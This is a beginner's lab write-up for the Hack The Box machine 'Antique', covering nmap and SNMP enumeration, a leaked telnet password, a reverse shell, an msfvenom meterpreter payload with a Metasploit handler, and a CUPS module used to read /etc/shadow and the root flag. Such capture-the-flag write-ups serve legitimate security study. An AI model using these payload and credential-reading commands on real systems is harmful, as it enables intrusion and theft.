# Antique

This is my write-up for the machine **Antique** located at: [https://app.hackthebox.com/machines/Antique](https://app.hackthebox.com/machines/Antique).&#x20;

{% hint style="info" %}
I am a beginner at penetration testing, so I will be referencing the Official Hack The Box Walk-through for this machine.
{% endhint %}

From the tags, I am able to notice that this machine is about printer exploitation on Linux:

![](<../../.gitbook/assets/image (341) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

A basic nmap scan shows that only telnet is online:

![](<../../.gitbook/assets/image (331) (1) (1) (1) (1).png>)

Trying to telnet into the system, it asks for a password:

![](<../../.gitbook/assets/image (348) (1) (1) (1) (1) (1) (1) (1) (1).png>)

I also had a deeper nmap scan running: `nmap -A -T4 -p- 10.10.11.107 -oN antique.nmap`

```
// SomeStarting Nmap 7.92 ( https://nmap.org ) at 2021-12-21 16:13 EST
Warning: 10.10.11.107 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.11.107
Host is up (0.036s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
23/tcp    open     telnet?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns, tn3270: 
|     JetDirect
|     Password:
|   NULL: 
|_    JetDirect
530/tcp   filtered courier
37918/tcp filtered unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port23-TCP:V=7.92%I=7%D=12/21%Time=61C2455F%P=x86_64-pc-linux-gnu%r(NUL
SF:L,F,"\nHP\x20JetDirect\n\n")%r(GenericLines,19,"\nHP\x20JetDirect\n\nPa
SF:ssword:\x20")%r(tn3270,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(GetRe
SF:quest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(HTTPOptions,19,"\nHP\x
SF:20JetDirect\n\nPassword:\x20")%r(RTSPRequest,19,"\nHP\x20JetDirect\n\nP
SF:assword:\x20")%r(RPCCheck,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DN
SF:SVersionBindReqTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(DNSStatus
SF:RequestTCP,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Help,19,"\nHP\x20
SF:JetDirect\n\nPassword:\x20")%r(SSLSessionReq,19,"\nHP\x20JetDirect\n\nP
SF:assword:\x20")%r(TerminalServerCookie,19,"\nHP\x20JetDirect\n\nPassword
SF::\x20")%r(TLSSessionReq,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(Kerb
SF:eros,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(SMBProgNeg,19,"\nHP\x20
SF:JetDirect\n\nPassword:\x20")%r(X11Probe,19,"\nHP\x20JetDirect\n\nPasswo
SF:rd:\x20")%r(FourOhFourRequest,19,"\nHP\x20JetDirect\n\nPassword:\x20")%
SF:r(LPDString,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPSearchReq,19
SF:,"\nHP\x20JetDirect\n\nPassword:\x20")%r(LDAPBindReq,19,"\nHP\x20JetDir
SF:ect\n\nPassword:\x20")%r(SIPOptions,19,"\nHP\x20JetDirect\n\nPassword:\
SF:x20")%r(LANDesk-RC,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(TerminalS
SF:erver,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(NCP,19,"\nHP\x20JetDir
SF:ect\n\nPassword:\x20")%r(NotesRPC,19,"\nHP\x20JetDirect\n\nPassword:\x2
SF:0")%r(JavaRMI,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(WMSRequest,19,
SF:"\nHP\x20JetDirect\n\nPassword:\x20")%r(oracle-tns,19,"\nHP\x20JetDirec
SF:t\n\nPassword:\x20")%r(ms-sql-s,19,"\nHP\x20JetDirect\n\nPassword:\x20"
SF:)%r(afp,19,"\nHP\x20JetDirect\n\nPassword:\x20")%r(giop,19,"\nHP\x20Jet
SF:Direct\n\nPassword:\x20");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 626.36 seconds

```

This nmap scan came back with pretty much the same information. I then viewed the walk-through to see where I had messed up. I learned about a tool called **snmpwalk**. In the walk-through, the author runs `snmpwalk -v 2c -c public 10.10.11.107`, which gets the following output:

![](<../../.gitbook/assets/image (332) (1) (1) (1) (1) (1).png>)

I had actually had found the password for telnet on my own, but I was unable to decode it:

![](<../../.gitbook/assets/image (333) (1) (1) (1) (1).png>)

I use **snmpget**, while the walk-through used **snmpwalk**. In the walk-through they used **binascii** (python import) in order to decode the bytes. I wanted to find a solution that was a bit more basic. I ended up using [https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html](https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html) to convert the bytes from hex to ascii:

![](<../../.gitbook/assets/image (346) (1) (1) (1) (1) (1) (1) (1).png>)

The password seems to be: **P@ssw0rd@123!!123** I was in!

![](<../../.gitbook/assets/image (323) (1).png>)

I then noticed the walk-through mentioned to run `exec id`. I then tried playing around with linux commands, and ended up finding the user.txt file:

![](<../../.gitbook/assets/image (325).png>)

I noticed the write-up use python for the reverse shell. I then used [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python) to see if I can use one of their python commands. Once I changed their python command from **python** to **python3**, it worked:

![](<../../.gitbook/assets/image (349) (1) (1) (1) (1) (1) (1).png>)

![](<../../.gitbook/assets/image (350) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

I viewed the walk-through again to see what I missed. The walk-through author runs the netstat command to see what connections are there:

![](<../../.gitbook/assets/image (345) (1) (1) (1) (1) (1) (1).png>)

They then go on to say that we should use **chisel** to connect to the port. I ran into an issue here where I was unable to download a GitHub repository onto the machine itself. I then realize that you make the binary locally and then upload it to the server. I uploaded the file to the machine by running `python3 -m http.server` on the folder where chisel was downloaded. I was then able to upload it by running `wget http://10.10.14.10:8000/chisel` on the remote machine. When I uploaded the file, I was unable to run it due to some dependency error in terms of version of libc:

![](<../../.gitbook/assets/image (351) (1) (1) (1) (1) (1) (1) (1) (1).png>)

&#x20;I then followed [this write-up](https://howtohack44323049.wordpress.com/2021/12/13/htb\_antique\_eng/) to see what I missed and what I could have done instead. They run `wget localhost:631`, which makes a file called **index.html** in the folder you are in. There, you can see that CUPS is mentioned:

![](<../../.gitbook/assets/image (339) (1) (1) (1) (1) (1) (1) (1) (1).png>)

When we search for cups on metasploit we get the following:

![](<../../.gitbook/assets/image (338) (1) (1) (1) (1) (1) (1).png>)

We first make a shell file to upload to the server. To do this, the walk-through mentioned previously mentions `msfvenom -p linux/x64/meterpreter/reverse`_`tcp LHOST=<`_`YOUR-IP> LPORT=1337 --format elf > shell`. This will make the **shell** file in your directory. To move it to the remote machine, you can use the python http.server command mentioned previously. Before I ran the shell executable, I ran the following commands in Metasploit (based off of [this write-up](https://howtohack44323049.wordpress.com/2021/12/13/htb\_antique\_eng/)):

```
use exploit/multi/handler
set lhost <YOUR_IP>
set lport 1337
set payload linux/x64/meterpreter/reverse_tcp 
run
```

After I ran the **run** command, I then switched to the remote machine and ran the shell executable (run `chmod +x shell` to make it executable). This gave me a connection in Metasploit:

![](<../../.gitbook/assets/image (347) (1) (1) (1) (1) (1) (1) (1).png>)

I then ran the following commands to look for the cups post exploitation program:

![](<../../.gitbook/assets/image (326).png>)

I then hit run and got an output:

![](<../../.gitbook/assets/image (344) (1) (1) (1) (1) (1) (1).png>)

Opening that file shows the output of /etc/shadow:

![](<../../.gitbook/assets/image (342) (1) (1) (1) (1) (1).png>)

Since we want to get the output of /root/root.txt, I changed my option in metasploit to that:

![](<../../.gitbook/assets/image (335) (1) (1) (1) (1) (1) (1).png>)

Reading that file got me the root flag:

![](<../../.gitbook/assets/image (340) (1) (1) (1) (1) (1) (1) (1).png>)
